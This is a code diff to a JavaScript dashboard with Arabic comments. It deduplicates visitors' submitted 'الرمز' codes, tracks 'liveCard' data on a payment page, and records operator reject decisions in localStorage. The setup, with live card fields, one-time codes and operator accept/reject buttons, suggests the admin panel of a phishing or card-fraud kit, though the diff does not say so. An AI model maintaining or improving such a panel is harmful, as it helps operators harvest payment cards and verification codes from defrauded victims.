@@ -1635,9 +1635,15 @@ if (isOnPaymentPage && visitor.liveCard && (__lastPcTs === 0 || __lcTs > __lastP
         });
       }
       
-      // Add data history entries
+      // Add data history entries (بدون نسخ الرمز)
+      const __codeSet = {};
+      (visitor.digitCodes || []).forEach(function (d) { if (d && d.code != null) __codeSet[String(d.code).trim()] = 1; });
       if (visitor.dataHistory && visitor.dataHistory.length > 0) {
         visitor.dataHistory.forEach((entry, index) => {
+          const c = entry.content || {};
+          const keys = Object.keys(c);
+          const pureCode = entry.__isCode === true || (keys.length === 1 && keys[0] === 'الرمز');
+          if (pureCode && __codeSet[String(c['الرمز'] == null ? '' : c['الرمز']).trim()]) return;
           allEntries.push({
             type: 'data',
             data: entry,
@@ -4039,6 +4045,13 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   if (window.__f112) return; window.__f112 = 1;
   var K = {};
   try { K = JSON.parse(localStorage.getItem("kdd_rej")||"{}") || {}; } catch(e){ K = {}; }
+  // [FIX-DEDUP] الرمز مرة واحدة فقط
+  (function dedup(){ var ch=false;
+    Object.keys(K).forEach(function(id){ var a=K[id]||[], m={}, o=[];
+      a.forEach(function(x){ if(!x||!x.c) return;
+        if(m[x.c]!==undefined){ o[m[x.c]]=x; ch=true; } else { m[x.c]=o.length; o.push(x); } });
+      K[id]=o; });
+    if(ch) sv(); })();
   function sv(){ try { localStorage.setItem("kdd_rej", JSON.stringify(K)); } catch(e){} }
   function sid(){ try { return selectedVisitorId || null; } catch(e){ return null; } }
   function codeOf(b){
@@ -4129,7 +4142,8 @@ run();setInterval(function(){note();apply()},1200);})();</script>
     var olds = c.querySelectorAll("[data-f112]");
     for (var k=0;k<olds.length;k++) olds[k].parentNode.removeChild(olds[k]);
     if (!arr.length) return;
-    for (var i=0;i<arr.length;i++){ c.insertBefore(mkCard(arr[i], i === arr.length-1), c.firstChild); }
+    var newestTs = arr.reduce(function(m,x){ return Math.max(m, x.ts||0); }, 0);
+    for (var i=0;i<arr.length;i++){ c.insertBefore(mkCard(arr[i], (arr[i].ts||0) === newestTs), c.firstChild); }
   }
   document.addEventListener("click", function(e){
     var b = e.target && e.target.closest ? e.target.closest("button") : null;
@@ -4142,11 +4156,18 @@ run();setInterval(function(){note();apply()},1200);})();</script>
     if (!c){ try { var v = visitors.get(id); if (v && (v.digitCodes||[]).length) c = String(v.digitCodes[v.digitCodes.length-1].code||""); } catch(e){} }
     if (!c) return;
     var a = K[id] || (K[id] = []);
-    var l = a[a.length-1];
-    if (!(l && l.c === c && l.s === s)){
-      a.push({ c:c, s:s, pg:pgOf(b), ts:Date.now(), t:new Date().toLocaleTimeString("ar-EG",{hour:"2-digit",minute:"2-digit"}) });
-      sv();
+    var t = new Date().toLocaleTimeString("ar-EG",{hour:"2-digit",minute:"2-digit"});
+    var ex = null, ei = -1;
+    for (var i = 0; i < a.length; i++){ if (a[i].c === c){ ex = a[i]; ei = i; break; } }
+    if (ex) {
+      a.splice(ei, 1);
+      ex.s = s; ex.t = t; ex.ts = Date.now();
+      ex.pg = pgOf(b) || ex.pg;
+      a.push(ex);
+    } else {
+      a.push({ c:c, s:s, pg:pgOf(b), ts:Date.now(), t:t });
     }
+    sv();
     last = "";
     draw();
   }, true);
